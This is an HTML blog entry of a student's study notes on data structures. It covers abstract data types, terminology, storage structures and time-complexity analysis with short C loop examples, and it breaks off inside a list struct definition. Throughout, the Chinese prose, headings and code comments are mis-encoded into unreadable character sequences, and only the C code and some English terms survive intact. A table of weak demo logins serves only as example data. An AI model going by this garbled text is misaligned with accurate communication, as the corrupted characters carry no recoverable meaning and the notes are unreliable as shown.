        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢</p><p>è¿™ä¸ªè¯¾æ˜¯ä»¥å‰ä»æ¥æ²¡æ¥è§¦è¿‡çš„ä¸œè¥¿ï¼Œè€Œä¸”ä¸€ç›´å­¦ webï¼Œå¤ªä¹…æ²¡æ¥è§¦ c è¯­è¨€äº†ï¼Œç¬¬ä¸€èŠ‚è¯¾çœ‹åˆ° for å¾ªç¯ç”šè‡³æœ‰ç‚¹é™Œç”Ÿï¼Œå­¦å¾—æœ‰ç‚¹åƒåŠ›ï¼Œæ‰€ä»¥å¿…é¡»æ•´ç‚¹ç¬”è®°ï¼Œè®°ä¸‹ç›¸å…³æ¦‚å¿µã€çŸ¥è¯†ç‚¹å’Œå¹³æ—¶å­¦ä¹ è¿‡ç¨‹ä¸­çš„é—®é¢˜å’Œæ€è€ƒï¼ŒæœŸæœ«å¤ä¹ ç”¨</p><p>2022.1.23</p><p>æ²¡æƒ³åˆ°æˆ‘è¿™ç¬”è®°è¿˜èƒ½ç•™åˆ°è€ƒç ”ç”¨ï¼Œå±äºæ˜¯æœªé›¨ç»¸ç¼ªäº†</p></blockquote><h1 id="ç¬¬ä¸€ç« -ç»ªè®º"><a href="#ç¬¬ä¸€ç« -ç»ªè®º" class="headerlink" title="ç¬¬ä¸€ç«  ç»ªè®º"></a>ç¬¬ä¸€ç«  ç»ªè®º</h1><ul><li>æ•°æ®ç»“æ„ç ”ç©¶ï¼šæ•°æ®çš„é€»è¾‘ç»“æ„ï¼ˆæ•°æ®å†…éƒ¨ä¹‹é—´çš„æ„æˆæ–¹æ³•ï¼‰ã€æ•°æ®çš„ç‰©ç†å‚¨å­˜ï¼ˆæ•°æ®åœ¨å†…å­˜é‡Œé¢æ€ä¹ˆå­˜çš„ï¼‰ã€æ•°æ®çš„æ“ä½œå®ç°ï¼ˆç”¨ä»€ä¹ˆè¯­è¨€å†™ï¼Œç”¨ä»€ä¹ˆç®—æ³•å®ç°ï¼‰ä¸‰æ–¹é¢çš„é—®é¢˜</li></ul><h2 id="æŠ½è±¡æ•°æ®ç±»å‹ï¼ˆAbstract-Data-Typeï¼ŒADTï¼‰"><a href="#æŠ½è±¡æ•°æ®ç±»å‹ï¼ˆAbstract-Data-Typeï¼ŒADTï¼‰" class="headerlink" title="æŠ½è±¡æ•°æ®ç±»å‹ï¼ˆAbstract Data Typeï¼ŒADTï¼‰"></a>æŠ½è±¡æ•°æ®ç±»å‹ï¼ˆAbstract Data Typeï¼ŒADTï¼‰</h2><p>ä¸€ä¸ªæ•°å­¦æ¨¡å‹ä»¥åŠå®šä¹‰åœ¨è¯¥æ¨¡å‹ä¸Šçš„ä¸€ç»„æ“ä½œï¼Œå¼ºè°ƒå¯¹æ•°æ®ç±»å‹çš„æŠ½è±¡ï¼Œä¸è®²ç©¶å…·ä½“å®ç°</p><p>ä½œç”¨ï¼šç›®çš„åœ¨äºéšè—è¿ç®—å®ç°çš„ç»†èŠ‚å’Œå†…éƒ¨æ•°æ®ç»“æ„ï¼ŒåŒæ—¶å‘ç”¨æˆ·æä¾›è¯¥æ•°æ®ç±»å‹çš„æ¥å£</p><h2 id="åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼ˆApplication-Program-Interfaceï¼ŒAPIï¼‰"><a href="#åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼ˆApplication-Program-Interfaceï¼ŒAPIï¼‰" class="headerlink" title="åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼ˆApplication Program Interfaceï¼ŒAPIï¼‰"></a>åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼ˆApplication Program Interfaceï¼ŒAPIï¼‰</h2><p>æŠŠå®ç°å’Œä½¿ç”¨åˆ†ç¦»ï¼ŒæŠŠç¼–ç¨‹æ¨¡å—åŒ–ï¼Œå‡½æ•°å°è£…æˆçš„åº“å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„APIæ¥å£ï¼Œåªç®¡ç”¨ï¼Œä¸€èˆ¬ä¸ç”¨ç®¡è¿™ä¸ªåº“æ˜¯æ€ä¹ˆå†™çš„ï¼Œè¿™ä¹Ÿæ˜¯é¢å‘å¯¹è±¡ç¼–ç¨‹çš„ä¸€ä¸ªé‡è¦æ€ç»´</p><h2 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h2><h3 id="è¡Œè¯"><a href="#è¡Œè¯" class="headerlink" title="è¡Œè¯"></a>è¡Œè¯</h3><ul><li>æ•°æ®ï¼šä¿¡æ¯çš„è½½ä½“ï¼Œèƒ½å¤Ÿè¢«è®¡ç®—æœºç¨‹åºå¤„ç†çš„ä¸€äº›ç¬¦å·ï¼ˆå­—ç¬¦ã€æ•°å­—ã€å£°éŸ³å’Œå›¾åƒç­‰ç­‰ï¼‰</li><li>æ•°æ®å…ƒç´ &#x2F;ç»“ç‚¹ï¼šç»„æˆæ•°æ®çš„åŸºæœ¬å•ä½</li><li>æ•°æ®é¡¹ï¼š&#x3D;&#x3D;æ˜¯æ•°æ®çš„æœ€å°å•ä½&#x3D;&#x3D;ï¼Œæ˜¯æ•°æ®å…ƒç´ çš„ç»„æˆå•ä½ï¼Œæ¯”å®ƒè¿˜å°</li><li>æ•°æ®ç»“æ„ï¼šå­˜åœ¨ç›¸äº’å…³ç³»çš„æ•°æ®å…ƒç´ çš„é›†åˆï¼Œå¼€å‘è€…ä¼šæ ¹æ®è¿™ç§æ•°æ®ç»“æ„è®¾è®¡ç›¸åº”çš„ç®—æ³•ï¼Œç¡®ä¿è¿ç®—ä»¥åçš„æ–°ç»“æ„ä¾æ—§ä¿æŒåŸæ¥çš„ç»“æ„ç±»å‹</li><li>æ•°æ®å¯¹è±¡ï¼šæ˜¯å¿…é¡»ç”±è½¯ä»¶ç†è§£çš„å¤åˆä¿¡æ¯è¡¨ç¤ºï¼Œè·Ÿä¸Šé¢å››ä¸ªä¸œè¥¿æ²¡æœ‰å¾ˆå¼ºçš„é€»è¾‘å…³ç³»ï¼Œæ•°æ®å¯¹è±¡æè¿°åŒ…æ‹¬äº†å…¶æ‰€æœ‰çš„å±æ€§ï¼Œåªç”¨æ¥å°è£…æ•°æ®ï¼Œä¸å¯¹æ•°æ®è¿›è¡Œæ“ä½œ</li></ul><hr><blockquote><p>æ•´ç‚¹è‡ªå·±çš„ç†è§£</p></blockquote><p>å‡å¦‚æœ‰ä¸¤å¼ è¡¨ï¼Œä¸€ä¸ªæ˜¯è¯¾ç¨‹è¡¨ï¼Œä¸€ä¸ªæ˜¯æ†¨æ†¨å¼±å£ä»¤è¡¨ï¼Œé‚£ä¹ˆè¿™ä¸¤å¼ è¡¨å°±æ˜¯&#x3D;&#x3D;æ•°æ®&#x3D;&#x3D;</p><table><thead><tr><th>è¯¾ç¨‹ä»£å·</th><th>è¯¾ç¨‹åå­—</th><th>æˆè¯¾è€å¸ˆ</th></tr></thead><tbody><tr><td>123456789</td><td>æ•°æ®ç»“æ„</td><td>å¼ ç‘éœ</td></tr><tr><td>987654321</td><td>ç½‘ç»œæ¸—é€æµ‹è¯•</td><td>xx</td></tr><tr><td>135792468</td><td>ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€</td><td>xxx</td></tr></tbody></table><table><thead><tr><th>id</th><th>username</th><th>password</th></tr></thead><tbody><tr><td>1</td><td>admin</td><td>123456</td></tr><tr><td>2</td><td>root</td><td>root</td></tr><tr><td>3</td><td>admin888</td><td>888888</td></tr></tbody></table><p>æ¯ä¸€å¼ è¡¨çš„æ¯ä¸€è¡Œæ•°æ®å°±æ˜¯&#x3D;&#x3D;æ•°æ®å…ƒç´ &#x3D;&#x3D;</p><p>æ¯ä¸€è¡Œé‡Œé¢çš„åˆ—å€¼å°±æ˜¯&#x3D;&#x3D;æ•°æ®é¡¹&#x3D;&#x3D;ï¼Œæ¯”å¦‚è¯¾ç¨‹åå­—ã€password</p><p>å‡ è¡Œå‡ åˆ—ï¼Œè¡Œçš„å€¼æœ€å¤§èƒ½å­˜å‚¨å¤šå°‘å­—èŠ‚ï¼Œèƒ½ä¸èƒ½ä¸ºç©ºï¼Œåˆ—çš„æ•°æ®ç±»å‹æ˜¯ä»€ä¹ˆï¼Œè¡¨å¤´æ˜¯ä»€ä¹ˆï¼Œè¿™äº›æ˜¯å¼€å‘è®¾è®¡çš„&#x3D;&#x3D;æ•°æ®ç»“æ„&#x3D;&#x3D;</p><p>å•ç‹¬çš„ä¸€å¼ è¡¨å°±æ˜¯å«&#x3D;&#x3D;æ•°æ®å¯¹è±¡&#x3D;&#x3D;ï¼Œæ¯”å¦‚æ†¨æ†¨å¼±å£ä»¤è¡¨å°±æ˜¯ä¸€ä¸ªæ•°æ®å¯¹è±¡ï¼Œè¯¾ç¨‹è¡¨ä¹Ÿæ˜¯ä¸€ä¸ªæ•°æ®å¯¹è±¡</p><hr><ul><li>å‰é©±ï¼šä¸€ä¸ªç»“ç‚¹å‰é¢çš„ç»“ç‚¹å«å‰é©±</li><li>åç»§ï¼šä¸€ä¸ªç»“ç‚¹åé¢çš„ç»“ç‚¹å«åç»§</li></ul><blockquote><p>æ‰€ä»¥å¾ˆæ˜æ˜¾å¼€å§‹çš„ç»“ç‚¹æ²¡æœ‰å‰é©±ï¼Œç»“æŸçš„ç»“ç‚¹æ²¡æœ‰åç»§ï¼Œæˆ‘å½“æ—¶å¬è¯¾è¿˜æƒ³è€åŠå¤©</p></blockquote><h3 id="æ•°æ®çš„é€»è¾‘ç»“æ„"><a href="#æ•°æ®çš„é€»è¾‘ç»“æ„" class="headerlink" title="æ•°æ®çš„é€»è¾‘ç»“æ„"></a>æ•°æ®çš„é€»è¾‘ç»“æ„</h3><p>å°±æ˜¯æ•°æ®å…ƒç´ ä¹‹é—´çš„é€»è¾‘å…³ç³»ï¼Œå¸¸è§ä»¥ä¸‹å››ç§ï¼š</p><ul><li>é›†åˆï¼šç»“ç‚¹ä¹‹é—´æ²¡æœ‰å…³ç³»</li><li>çº¿æ€§ç»“æ„ï¼šç»“ç‚¹ä¹‹é—´ä¸€å¯¹ä¸€è”ç³»èµ·æ¥ï¼Œ&#x3D;&#x3D;ä¸€æ ¹ç»³ä¸Šçš„èš‚èš±&#x3D;&#x3D;</li><li>æ ‘å½¢ç»“æ„ï¼šç»“ç‚¹ä¹‹é—´ä¸€å¯¹å¤šçš„å…³ç³»ï¼Œ&#x3D;&#x3D;å«æ ‘å½¢ç»“æ„çš„åŸå› ä¹Ÿæ˜¯å› ä¸ºå’Œç°å®ç”Ÿæ´»ä¸­çš„æ ‘çš„æ ‘æå¾ˆåƒå§&#x3D;&#x3D;</li><li>å›¾å½¢ç»“æ„ï¼šç»“ç‚¹ä¹‹é—´å¤šå¯¹å¤šçš„å…³ç³»</li></ul><h3 id="æ•°æ®çš„å­˜å‚¨ç»“æ„"><a href="#æ•°æ®çš„å­˜å‚¨ç»“æ„" class="headerlink" title="æ•°æ®çš„å­˜å‚¨ç»“æ„"></a>æ•°æ®çš„å­˜å‚¨ç»“æ„</h3><ul><li>é¡ºåºå­˜å‚¨ç»“æ„ï¼šæ‹¿è®¡ç®—æœºé‡Œä¸€ç»„è¿ç»­çš„å­˜å‚¨å•å…ƒæ¥å­˜æ”¾æ•°æ®ï¼Œç”¨å†…å­˜åœ°å€æ¥ä½“ç°é€»è¾‘å…³ç³»ï¼Œå¯ä»¥ç†è§£ä¸ºé€»è¾‘å…³ç³»å’Œç‰©ç†ä½ç½®æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ’å¥½é˜Ÿã€‚å¯¹åº”ä¹‹åå­¦ä¹ çš„&#x3D;&#x3D;é¡ºåºè¡¨&#x3D;&#x3D;</li><li>é“¾å¼å­˜å‚¨ç»“æ„ï¼šæ•°æ®å…ƒç´ å­˜æ”¾ä½ç½®ç”±ç¼–è¯‘å™¨éšæœºåˆ†é…ï¼Œæ•°æ®å…ƒç´ ä¹‹é—´çš„é€»è¾‘å…³ç³»å°±ä¸èƒ½é€šè¿‡ç‰©ç†ä½ç½®æ¥ä½“ç°ï¼Œéœ€è¦ç”¨æŒ‡é’ˆæ¥æŠŠåˆ†æ•£çš„ç»“ç‚¹ä¸²èµ·æ¥ã€‚å¯¹åº”ä¹‹åå­¦ä¹ çš„&#x3D;&#x3D;é“¾è¡¨&#x3D;&#x3D;</li><li>ç´¢å¼•å­˜å‚¨ç»“æ„ï¼šåœ¨å­˜å‚¨ç»“ç‚¹çš„æ—¶å€™åŒæ—¶å¢åŠ ä¸€ä¸ªç´¢å¼•è¡¨ï¼Œè¡¨ä¸­çš„æ¯ä¸€é¡¹ä½œä¸ºç´¢å¼•é¡¹ï¼Œéœ€è¦åŒ…å«ä¸€ä¸ªç»“ç‚¹çš„å…³é”®ç ï¼ˆå‡†ç¡®è¯†åˆ«ï¼‰å’Œå­˜å‚¨ä½ç½®</li><li>æ•£åˆ—å‚¨å­˜ç»“æ„ï¼šå°†ç»“ç‚¹çš„å…³é”®å­—ä½œä¸ºæ•£åˆ—å‡½æ•°çš„è¾“å…¥ï¼Œæ•£åˆ—å‡½æ•°è¾“å‡ºçš„æ˜¯ç»“ç‚¹çš„å­˜å‚¨ä½ç½®</li></ul><h3 id="æ•°æ®çš„æ“ä½œ"><a href="#æ•°æ®çš„æ“ä½œ" class="headerlink" title="æ•°æ®çš„æ“ä½œ"></a>æ•°æ®çš„æ“ä½œ</h3><p>ä¼˜ç§€çš„ç®—æ³•</p><h2 id="ç®—æ³•å¤æ‚åº¦"><a href="#ç®—æ³•å¤æ‚åº¦" class="headerlink" title="ç®—æ³•å¤æ‚åº¦"></a>ç®—æ³•å¤æ‚åº¦</h2><ul><li>åˆ†æ—¶é—´å¤æ‚åº¦å’Œç©ºé—´å¤æ‚åº¦</li></ul><h3 id="æ—¶é—´å¤æ‚åº¦"><a href="#æ—¶é—´å¤æ‚åº¦" class="headerlink" title="æ—¶é—´å¤æ‚åº¦"></a>æ—¶é—´å¤æ‚åº¦</h3><p>ç®—æ³•çš„åŸºæœ¬æ“ä½œé‡å¤æ‰§è¡Œçš„æ¬¡æ•°ç”¨<code>T(n)</code>è¡¨ç¤ºï¼Œå†æ¥ä¸€ä¸ªè¾…åŠ©å‡½æ•°<code>f(n)</code>ï¼Œå½“ n è¶‹äºæ­£æ— ç©·çš„æ—¶å€™ï¼Œ<code>T(n)</code>&#x2F;<code>f(n)</code>ä¸ºä¸€ä¸ªå¸¸æ•°ï¼Œå³è¾…åŠ©å‡½æ•°æ˜¯æ‰§è¡Œæ¬¡æ•°çš„åŒæ•°é‡çº§å‡½æ•°æ—¶ï¼Œæ—¶é—´å¤æ‚åº¦å°±æ˜¯<code>O(f(n))</code></p><h3 id="åˆ†ææ–¹æ³•"><a href="#åˆ†ææ–¹æ³•" class="headerlink" title="åˆ†ææ–¹æ³•"></a>åˆ†ææ–¹æ³•</h3><ol><li><p>&#x3D;&#x3D;åªå…³æ³¨å¾ªç¯æ‰§è¡Œæ¬¡æ•°æœ€å¤šçš„é‚£æ®µä»£ç &#x3D;&#x3D;</p><p>&#x3D;&#x3D;æ—¶é—´å¤æ‚åº¦æ˜¯ä¸€ç§å˜åŒ–çš„è¶‹åŠ¿ï¼Œå½“ n è¶‹äºæ— ç©·å¤§æ—¶ï¼Œé€šå¸¸å¿½ç•¥æ‰å¸¸é‡ã€ä½é˜¶å’Œç³»æ•°çš„å½±å“ï¼Œåªè®°å½•å¤§çš„é«˜é˜¶é‡&#x3D;&#x3D;</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f0x</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum += i;<span class="comment">//æ±‚å’Œ</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¿™æ®µä»£ç æˆ‘ä»¬å°±åªç”¨çœ‹ sum+=1 å¾ªç¯äº† n æ¬¡ï¼Œæ‰€ä»¥æ—¶é—´å¤æ‚åº¦å°±æ˜¯O(n)</span></span><br></pre></td></tr></table></figure></li><li><p>åŠ æ³•æ³•åˆ™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f0x</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> sum_1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum_1 += i;<span class="comment">//æ±‚å’Œ</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> sum_2 = <span class="number">0</span>;</span><br><span class="line">    i = i ^ i;<span class="comment">//æŠŠiç½®é›¶</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum_2 += i;<span class="comment">//æ±‚å’Œ</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum_1 + sum_2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ— æ³•è¯„ä¼° m å’Œ n åŒæ—¶è¶‹äºæ­£æ— ç©·æ—¶å“ªä¸ªå¤§ï¼Œæ‰€ä»¥ç”¨åŠ æ³•æ³•åˆ™ T1(m)+ T2(n) = O(f(m)) + O(f(n))</span></span><br></pre></td></tr></table></figure></li><li><p>ä¹˜æ³•æ³•åˆ™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f0x</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> flag = <span class="number">0</span>;<span class="comment">//è®¡æ•°å™¨</span></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n;i++)<span class="comment">//æ‰§è¡Œ n+1 æ¬¡</span></span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; n;j++)<span class="comment">//æ‰§è¡Œ n(n+1) æ¬¡</span></span><br><span class="line">            flag++;<span class="comment">//æ‰§è¡Œ n^2æ¬¡</span></span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä¸€ç»„åµŒå¥—çš„ for å¾ªç¯ï¼ŒT(n)=2n^2+2n+1ï¼Œå–åŒæ•°é‡çº§ n^2ä½œä¸ºæ—¶é—´å¤æ‚åº¦ï¼Œå³O(n^2)</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="ä¸¾ä¾‹"><a href="#ä¸¾ä¾‹" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h3><ul><li><p>çº¿æ€§çº§æ•°O(n)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(flag = <span class="number">0</span>,i = <span class="number">0</span>;i &lt; n;i++)<span class="comment">// n+1 æ¬¡</span></span><br><span class="line">    flag++;<span class="comment">//n æ¬¡</span></span><br><span class="line"><span class="comment">// T(n)=2n+1</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(flag = <span class="number">0</span>,i = <span class="number">1</span>;i &lt;= n;i = i * <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">1</span>;j &lt;= i;j++)</span><br><span class="line">        flag++;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰è¡Œçš„æ‰§è¡Œæ¬¡æ•°æ˜¯ä¸€ä¸ªç­‰æ¯”æ•°åˆ—çš„å’Œï¼Œç­‰æ¯”æ•°åˆ—ä¸º 1+2+4+2^(log<del>2</del>^n^+1)+â€¦ ï¼Œåˆ©ç”¨é«˜ç­‰æ•°å­¦çš„çŸ¥è¯†å¯ä»¥çŸ¥é“æ—¶é—´å¤æ‚åº¦ä¸º O(n)</p></li><li><p>å¯¹æ•°çº§æ•°O(log<del>x</del>^n^)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(flag = <span class="number">0</span>,i = <span class="number">1</span>;i &lt;= n;i = i * x)</span><br><span class="line">    flag++;</span><br><span class="line"><span class="comment">// å½“ n=1æ—¶ï¼Œå¾ªç¯æ‰§è¡Œ1æ¬¡,n=x^2æ—¶ï¼Œå¾ªç¯æ‰§è¡Œ2æ¬¡ï¼Œn=x^3æ—¶ï¼Œå¾ªç¯æ‰§è¡Œ3æ¬¡ï¼Œæ•°å­¦è§„å¾‹ä¸ºå¾ªç¯æ‰§è¡Œlogxnæ¬¡</span></span><br><span class="line"><span class="comment">// T(n)=logxn</span></span><br></pre></td></tr></table></figure></li><li><p>å¹³æ–¹çº§æ•°O(n^2^)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(flag = <span class="number">0</span>,i = <span class="number">0</span>;i &lt; n;i++)<span class="comment">// n+1 æ¬¡</span></span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; n;j++)<span class="comment">// n æ¬¡</span></span><br><span class="line">        flag++;<span class="comment">// n(n+1)æ¬¡</span></span><br><span class="line"><span class="comment">// T(n)=2n^2+2n+1</span></span><br></pre></td></tr></table></figure></li><li><p>äºŒé˜¶çº§æ•°O(nlog<del>x</del>^n^)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(flag = <span class="number">0</span>,i =<span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">1</span>;j &lt;= n;j = j * x)</span><br><span class="line">        flag++;</span><br><span class="line"><span class="comment">// ç¬¬ä¸€è¡Œæ‰§è¡Œ n+1 æ¬¡ï¼Œç¬¬äºŒè¡Œæ‰§è¡Œ logxn æ¬¡ï¼Œç¬¬ä¸‰è¡Œæ‰§è¡Œ nlogxn æ¬¡</span></span><br><span class="line"><span class="comment">// T(n)= n+1+logxn+nlogxn</span></span><br></pre></td></tr></table></figure><ul><li>äºŒé˜¶çº§æ•°çš„å†…å¤–å±‚å¾ªç¯è°ƒæ¢é¡ºåºç»“æœä¹Ÿæ˜¯ä¸€æ ·</li></ul></li></ul><blockquote><p>ç¬¬ä¸€ç« ç»“æŸï¼Œæ¦‚å¿µæ¯”è¾ƒå¤šï¼Œæ—¶é—´å¤æ‚åº¦æ¯”è¾ƒé‡è¦</p><p>å»csdnçœ‹åˆ°çš„æ¯”è¾ƒå¥½çš„æ–‡ç« </p><p><a href="https://blog.csdn.net/weixin_39596963/article/details/80987779?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160099621219724835865369%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=160099621219724835865369&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v25-1-80987779.first_rank_v2_rank_v25&amp;utm_term=%E6%B8%90%E8%BF%9B%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6&amp;spm=1018.2118.3001.4187">https://blog.csdn.net/weixin_39596963/article/details/80987779?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160099621219724835865369%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=160099621219724835865369&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v25-1-80987779.first_rank_v2_rank_v25&amp;utm_term=%E6%B8%90%E8%BF%9B%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6&amp;spm=1018.2118.3001.4187</a></p><p><a href="https://blog.csdn.net/qq_41523096/article/details/82142747?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160099621219724835865369%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=160099621219724835865369&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-3-82142747.first_rank_v2_rank_v25&amp;utm_term=%E6%B8%90%E8%BF%9B%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6&amp;spm=1018.2118.3001.4187">https://blog.csdn.net/qq_41523096/article/details/82142747?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160099621219724835865369%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=160099621219724835865369&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-3-82142747.first_rank_v2_rank_v25&amp;utm_term=%E6%B8%90%E8%BF%9B%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6&amp;spm=1018.2118.3001.4187</a></p></blockquote><hr><h1 id="ç¬¬äºŒç« -çº¿æ€§è¡¨"><a href="#ç¬¬äºŒç« -çº¿æ€§è¡¨" class="headerlink" title="ç¬¬äºŒç«  çº¿æ€§è¡¨"></a>ç¬¬äºŒç«  çº¿æ€§è¡¨</h1><ul><li>çº¿æ€§è¡¨æ˜¯ç”± n(n&gt;&#x3D;0) ä¸ªæ€§è´¨ç›¸åŒçš„æ•°æ®å…ƒç´ ç»„æˆçš„&#x3D;&#x3D;æœ‰é™åºåˆ—&#x3D;&#x3D;</li><li>åŒä¸€çº¿æ€§è¡¨ä¸­çš„å…ƒç´ ç±»å‹ç›¸åŒ</li><li>ä¸»è¦æ“ä½œæœ‰ï¼šåˆ›å»ºç©ºçº¿æ€§è¡¨ã€åˆ¤æ–­çº¿æ€§è¡¨æ˜¯å¦ä¸ºç©ºã€æ’å…¥ã€åˆ é™¤å’ŒæŸ¥æ‰¾ç­‰åŸºæœ¬æ“ä½œ</li></ul><h2 id="é¡ºåºè¡¨"><a href="#é¡ºåºè¡¨" class="headerlink" title="é¡ºåºè¡¨"></a>é¡ºåºè¡¨</h2><ul><li>é¡ºåºè¡¨ç”¨ä¸€ç»„&#x3D;&#x3D;åœ°å€è¿ç»­çš„å­˜å‚¨å•å…ƒ&#x3D;&#x3D;ä¾æ¬¡å­˜å‚¨çº¿æ€§è¡¨ä¸­çš„å„å…ƒç´ ï¼Œé€šè¿‡ä½ç½®æ¥è¡¨ç¤ºæ•°æ®å…ƒç´ ä¹‹é—´çš„é€»è¾‘å…³ç³»ï¼Œæ•°æ®å…ƒç´ çš„é€»è¾‘å…³ç³»å’Œç‰©ç†å…³ç³»ä¸€æ ·</li></ul><p><img src="https://raw.githubusercontent.com/C1everF0x/Images/master/20200929162306.png" alt="é“¾è¡¨å’Œé¡ºåºè¡¨"></p><h3 id="é¡ºåºè¡¨ç±»å‹å®šä¹‰"><a href="#é¡ºåºè¡¨ç±»å‹å®šä¹‰" class="headerlink" title="é¡ºåºè¡¨ç±»å‹å®šä¹‰"></a>é¡ºåºè¡¨ç±»å‹å®šä¹‰</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> DataType;<span class="comment">//ç»™ int æ¢åå­—</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">List</span>//å®šä¹‰é¡ºåºè¡¨ç±»å‹</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> Max;<span class="comment">//æœ€å¤§å…ƒç´ 